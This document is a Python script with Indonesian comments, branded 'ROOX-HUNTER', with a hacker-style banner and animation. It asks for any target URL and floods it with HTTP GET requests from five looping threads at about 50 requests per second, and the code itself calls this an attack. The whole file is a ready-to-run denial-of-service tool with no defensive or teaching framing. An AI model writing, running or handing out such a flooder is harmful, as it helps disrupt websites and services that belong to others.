import os
import threading
import requests
import time
import random
import sys

# Konfigurasi
THREADS = 5              # jumlah thread
REQ_PER_THREAD = 10      # request per thread per detik (5 x 10 = 50 total)

# Warna teks
G = "\033[1;92m"
R = "\033[1;91m"
C = "\033[1;96m"
Y = "\033[1;93m"
END = "\033[0m"

# Global Counter
total_sent = 0
lock = threading.Lock()

# Clear screen
def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Banner ROOX
def banner():
    clear()
    print(G + r"""
██╗ █████╗ ███╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
      ██║██╔══██╗████╗ ██║██╔════╝ ██╔═══██╗╚██╗██╔╝
      ██║███████║██╔██╗██║██║  ███╗██║   ██║ ╚███╔╝ 
 ██   ██║██╔══██║██║╚████║██║   ██║██║   ██║ ██╔██╗ 
 ╚█████╔╝██║  ██║██║ ╚███║╚██████╔╝╚██████╔╝██╔╝ ██╗
  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
""" + END)
    print(C + "[!] TOOL: ROOX-HUNTER | By ROOX" + END)
    print()

# Efek teks hijau ala hacker
def hacker_animation():
    chars = "0123456789ABCDEF"
    for _ in range(15):
        line = "".join(random.choice(chars) for _ in range(60))
        print(G + line + END)
        time.sleep(0.05)

# Cek koneksi target
def cek_target(url):
    try:
        print(C + "[•] Mengecek target..." + END)
        res = requests.get(url, timeout=5)
        print(G + f"[✓] Target aktif: {res.status_code}" + END)
    except:
        print(R + "[x] Gagal mengakses target, lanjut uji brute..." + END)

# Serangan permintaan HTTP
def attack(url):
    global total_sent
    while True:
        for _ in range(REQ_PER_THREAD):
            try:
                requests.get(url, timeout=3)
                with lock:
                    total_sent += 1
            except:
                pass
        time.sleep(1)

# Monitor + animasi
def monitor():
    while True:
        hacker_animation()
        with lock:
            print(C + f"[•] Total request terkirim: {total_sent}" + END)
        time.sleep(1)

# Main
def main():
    banner()
    target = input(Y + "[?] Masukkan URL target (gunakan http/https): " + END)
    if not target.startswith("http"):
        target = "http://" + target

    cek_target(target)

    print(C + "[•] Memulai serangan 50 request/detik..." + END)
    time.sleep(1)

    # Mulai thread serangan
    for _ in range(THREADS):
        t = threading.Thread(target=attack, args=(target,))
        t.daemon = True
        t.start()

    # Thread monitor
    monitor()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(R + "\n[!] Dihentikan oleh user." + END)
        sys.exit()
